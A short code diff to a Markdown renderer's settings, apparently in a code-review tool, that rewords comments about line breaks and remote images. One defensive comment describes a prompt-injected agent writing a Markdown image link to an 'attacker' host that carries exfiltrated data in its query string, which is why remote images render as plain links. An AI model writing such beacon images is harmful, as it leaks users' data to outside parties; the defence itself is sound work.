@@ -11,7 +11,7 @@ const md = new MarkdownIt({
   // its own token and linkify never sees it.
   linkify: true,
   // A lone newline becomes <br>, matching the whitespace-pre-wrap feel messages
-  // had before — agent replies rely on single-newline line breaks reading as breaks.
+  // had before — agent comments rely on single-newline line breaks reading as breaks.
   breaks: true,
 });
 // Scheme-required auto-linking only: linkify's fuzzy mode would turn any bare
@@ -70,7 +70,7 @@ export const REMOTE_URL_RE = /^(?!data:)[a-z][a-z0-9+.-]*:|^\/\//i;
 
 // Images are the one Markdown construct that reaches the network with no click.
 // Both sides of this app render text we don't trust — a prompt-injected agent
-// writes feedback and replies, and a reviewed repo's README is someone else's
+// writes discussions and comments, and a reviewed repo's README is someone else's
 // file — so `![](https://attacker/?d=…)` would beacon (and could carry
 // exfiltrated content in the query) the moment the human opens the review.
 // Render a remote image as the link it is and let the human decide to load it.
